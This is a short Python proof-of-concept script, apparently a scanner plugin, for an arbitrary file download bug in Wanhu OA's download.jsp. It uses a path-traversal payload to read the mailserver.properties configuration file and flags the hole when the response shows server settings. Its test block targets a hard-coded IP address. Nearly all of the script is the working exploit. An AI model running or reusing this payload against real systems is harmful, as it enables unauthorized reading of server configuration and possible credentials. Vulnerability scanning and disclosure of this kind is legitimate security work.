#!/usr/bin/env python
# -*- coding: utf-8 -*-
#POC Name  :万户oa前台download.jsp任意文件下载
#Author    : 这个程序员不太冷
#Referer   : http://www.wooyun.org/bugs/wooyun-2014-063711


import re


def assign(service,arg):
    if service == "whezeip":
        return True,arg

def audit(arg):
    payload="defaultroot/public/jsp/download.jsp?FileName=mailserver.properties&name=2.jsp&path=/../../config/"
    target=arg+payload
    code, head, res, errcode, _ = curl.curl2(target)
    if code==200 and 'port' in res and 'domain' in res and 'server' in res:
        security_hole(target)

if __name__ == '__main__':
    from dummy import *
    audit(assign('whezeip','http://60.172.210.251:7001/')[1])